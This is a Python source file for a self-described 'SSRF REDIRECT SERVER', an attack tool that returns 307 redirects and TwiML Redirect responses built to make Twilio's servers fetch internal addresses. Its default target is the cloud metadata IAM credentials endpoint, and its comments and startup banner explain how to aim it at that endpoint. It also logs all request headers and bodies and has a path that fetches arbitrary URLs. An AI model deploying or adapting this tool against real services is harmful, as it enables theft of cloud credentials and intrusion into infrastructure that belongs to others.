#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import os, sys, time, urllib.request

# ─── CONFIG ───────────────────────────────────────────────────────────────────
PORT        = int(os.environ.get("PORT", "8000"))
DEFAULT_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Vercel serverless FS is read-only except /tmp; local runs use cwd.
LOG_FILE    = (
    os.path.join("/tmp", "redirect_log.txt")
    if os.environ.get("VERCEL")
    else "redirect_log.txt"
)
# ──────────────────────────────────────────────────────────────────────────────

class RedirectHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        request_start = time.perf_counter()

        timestamp  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip  = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "none")
        referer    = self.headers.get("Referer", "none")
        full_url   = self.path

        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        # ── /twiml-redirect — serve TwiML with <Redirect> to internal target ──
        if parsed.path == '/twiml-redirect':
            target = params.get('url', [DEFAULT_URL])[0]

            twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Redirect method="GET">{target}</Redirect>
</Response>"""

            log_entry = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[{timestamp}] TWIML REDIRECT SERVED
  FROM       : {client_ip}
  TARGET     : {target}
  USER-AGENT : {user_agent}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            print(log_entry, flush=True)
            with open(LOG_FILE, "a") as f:
                f.write(log_entry)

            self.send_response(200)
            self.send_header("Content-Type", "text/xml")
            self.send_header("Content-Length", str(len(twiml.encode())))
            self.end_headers()
            self.wfile.write(twiml.encode())
            return

        # ── /twiml-say — serve TwiML with <Say> containing target URL content ──
        # Your server fetches the internal URL and reads the response,
        # then wraps it in TwiML so Twilio processes and logs it.
        # NOTE: This runs from YOUR server — useful only if your server
        # can reach the target (e.g. for testing). For real SSRF you want
        # /twiml-redirect which makes TWILIO fetch the internal URL.
        if parsed.path == '/twiml-say':
            target = params.get('url', [DEFAULT_URL])[0]

            try:
                req = urllib.request.Request(
                    target,
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                resp = urllib.request.urlopen(req, timeout=5)
                content = resp.read().decode('utf-8', errors='replace')
                status  = resp.status
            except Exception as e:
                content = f"ERROR: {str(e)}"
                status  = 0

            log_entry = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[{timestamp}] TWIML SAY — SERVER FETCHED
  FROM       : {client_ip}
  TARGET     : {target}
  HTTP STATUS: {status}
  RESPONSE   : {content[:2000]}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            print(log_entry, flush=True)
            with open(LOG_FILE, "a") as f:
                f.write(log_entry)

            # Sanitize for XML — strip chars that break TwiML
            safe_content = content.replace('&', 'and').replace('<', '').replace('>', '')[:500]

            twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Say>{safe_content}</Say>
</Response>"""

            self.send_response(200)
            self.send_header("Content-Type", "text/xml")
            self.send_header("Content-Length", str(len(twiml.encode())))
            self.end_headers()
            self.wfile.write(twiml.encode())
            return

        # ── /twiml — serve basic valid TwiML (useful as a fallback) ──
        if parsed.path == '/twiml':
            twiml = """<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Say>Hello</Say>
</Response>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/xml")
            self.send_header("Content-Length", str(len(twiml.encode())))
            self.end_headers()
            self.wfile.write(twiml.encode())
            return

        # ── Default: redirect handler ──────────────────────────────────────────
        if "redirect" not in params:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Hello World")
            elapsed_ms = (time.perf_counter() - request_start) * 1000
            print(f"[{timestamp}] 200 Hello World from {client_ip} — {elapsed_ms:.2f} ms", flush=True)
            return

        dest_url = params["redirect"][0]

        self.send_response(307)
        self.send_header("Location", dest_url)
        self.send_header("Content-Length", "0")
        self.end_headers()

        elapsed_ms = (time.perf_counter() - request_start) * 1000

        log_entry = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[{timestamp}] GET — 307 REDIRECT
  FROM       : {client_ip}
  REQUEST    : {full_url}
  REDIRECTING: {dest_url}
  USER-AGENT : {user_agent}
  REFERER    : {referer}
  TIMING     : {elapsed_ms:.2f} ms
  ALL HEADERS:
"""
        for key, val in self.headers.items():
            log_entry += f"    {key}: {val}\n"
        log_entry += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"

        print(log_entry, flush=True)
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

    def do_POST(self):
        request_start = time.perf_counter()

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]
        length    = int(self.headers.get("Content-Length", 0))
        body      = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""

        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        # ── POST to /twiml-redirect — same as GET version ─────────────────────
        if parsed.path == '/twiml-redirect':
            target = params.get('url', [DEFAULT_URL])[0]

            twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Redirect method="GET">{target}</Redirect>
</Response>"""

            log_entry = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[{timestamp}] POST TWIML REDIRECT SERVED
  FROM       : {client_ip}
  TARGET     : {target}
  USER-AGENT : {self.headers.get("User-Agent", "none")}
  BODY       : {body[:500]}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            print(log_entry, flush=True)
            with open(LOG_FILE, "a") as f:
                f.write(log_entry)

            self.send_response(200)
            self.send_header("Content-Type", "text/xml")
            self.send_header("Content-Length", str(len(twiml.encode())))
            self.end_headers()
            self.wfile.write(twiml.encode())
            return

        # ── POST to /twiml — return basic valid TwiML ──────────────────────────
        if parsed.path == '/twiml':
            twiml = """<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Say>Hello</Say>
</Response>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/xml")
            self.send_header("Content-Length", str(len(twiml.encode())))
            self.end_headers()
            self.wfile.write(twiml.encode())
            return

        # ── Default POST: log and return 307 redirect if param present ─────────
        dest_url = params.get("redirect", [None])[0]

        if dest_url:
            self.send_response(307)
            self.send_header("Location", dest_url)
            self.send_header("Content-Length", "0")
            self.end_headers()
            action = f"307 REDIRECT TO: {dest_url}"
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/xml")
            twiml = """<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Say>Hello</Say>
</Response>"""
            self.send_header("Content-Length", str(len(twiml.encode())))
            self.end_headers()
            self.wfile.write(twiml.encode())
            action = "200 TwiML Hello"

        elapsed_ms = (time.perf_counter() - request_start) * 1000

        log_entry = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[{timestamp}] POST RECEIVED — {action}
  FROM   : {client_ip}
  PATH   : {self.path}
  TIMING : {elapsed_ms:.2f} ms
  BODY   : {body}
  ALL HEADERS:
"""
        for key, val in self.headers.items():
            log_entry += f"    {key}: {val}\n"
        log_entry += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"

        print(log_entry, flush=True)
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║              SSRF REDIRECT SERVER — READY                    ║
╠══════════════════════════════════════════════════════════════╣
║  Port     : {PORT:<48}║
║  Log file : {LOG_FILE:<48}║
╠══════════════════════════════════════════════════════════════╣
║  ENDPOINTS:                                                  ║
║                                                              ║
║  /?redirect=URL                                              ║
║    Issues 307 redirect — preserves POST method               ║
║                                                              ║
║  /twiml-redirect?url=URL                                     ║
║    Returns TwiML <Redirect> — Twilio fetches URL internally  ║
║    USE THIS to make Twilio reach internal addresses          ║
║                                                              ║
║  /twiml-say?url=URL                                          ║
║    Your server fetches URL and wraps response in TwiML <Say> ║
║                                                              ║
║  /twiml                                                      ║
║    Returns basic valid TwiML — useful as fallback            ║
╠══════════════════════════════════════════════════════════════╣
║  EXAMPLE TWILIO CALL:                                        ║
║  url: https://YOUR_DOMAIN/twiml-redirect?url=               ║
║       http://169.254.169.254/latest/meta-data/               ║
╚══════════════════════════════════════════════════════════════╝
""")

    server = HTTPServer(("0.0.0.0", PORT), RedirectHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped.")
        sys.exit(0)